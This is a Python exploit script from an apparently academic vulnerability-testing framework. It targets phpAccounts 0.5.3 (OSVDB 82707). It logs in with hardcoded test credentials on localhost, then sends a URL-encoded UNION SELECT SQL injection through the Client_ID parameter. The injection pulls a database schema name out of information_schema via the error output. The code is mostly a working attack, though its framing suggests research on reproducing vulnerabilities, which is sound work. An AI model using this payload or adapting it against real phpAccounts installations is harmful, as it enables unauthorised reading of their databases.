
# Copyright 2013 University of Maryland.  All rights reserved.
# Use of this source code is governed by a BSD-style
# license that can be found in the LICENSE.TXT file.


import framework                        
import time
import selenium.common.exceptions
import re

class Exploit (framework.Exploit):
    attributes = {'Name' : "OSVDB_82707B",                        
                  'Description' : "SQL injection in view_client action",
                  'References' : [['OSVDB','82707'],['http://www.osvdb.org/show/osvdb/82707']],
                  'Target' : "phpAccounts 0.5.3",
                  'TargetLicense' : '',
                  'Type' : "SQL",
                  'VulWikiPage' : "",
                  'Privileged' : True
                  }

    def __init__(self, visible=False):
        framework.Exploit.__init__(self, visible)
        self.verified = False
        return

    def exploit(self):
        driver = self.create_selenium_driver()
        driver.get("http://127.0.0.1/phpaccounts/index.php")

        driver.get_element(by_xpath="//input[@name='Login_Username']").send_keys("phpaccounts@umd.edu")
        driver.get_element(by_xpath="//input[@name='Login_Password']").send_keys("phpaccountspw21")
        driver.get_element(by_xpath="//input[@value='Login']").click()
        driver.get_element(by_xpath="//frame[@name='leftFrame']")

        driver.get("http://127.0.0.1/phpaccounts/index.php?page=clients&action=view_client&Client_ID=-1%20UNION%20ALL%20SELECT%201,%28select%20schema_name%20from%20information_schema.schemata%20order%20by%20schema_name%20desc%20limit%201%29,%27a%27,%27a%27,%27a%27,%27a%27,%27a%27,%27a%27,%27a%27,%27a%27,%27a%27,%27a%27,%27a%27,%27a%27,%27a%27,%27a%27,%27a%27")

        tries = 4
        while(tries and (len(driver.page_source) == 0)):
            tries -= 1
            time.sleep(2)
            self.logger.info("Waiting to page to load")
        

        re_comp = re.compile(".+Unknown column '(.+)' in.+")
        dbname = re_comp.findall(driver.page_source)
        if(len(dbname)>0):
            self.verified = True
            self.logger.info("Extracted database name: %s", dbname[0])
        else:
            self.logger.info("Failed to inject query")
            print driver.page_source

        driver.cleanup()
        return                

    def verify(self):
        return self.verified
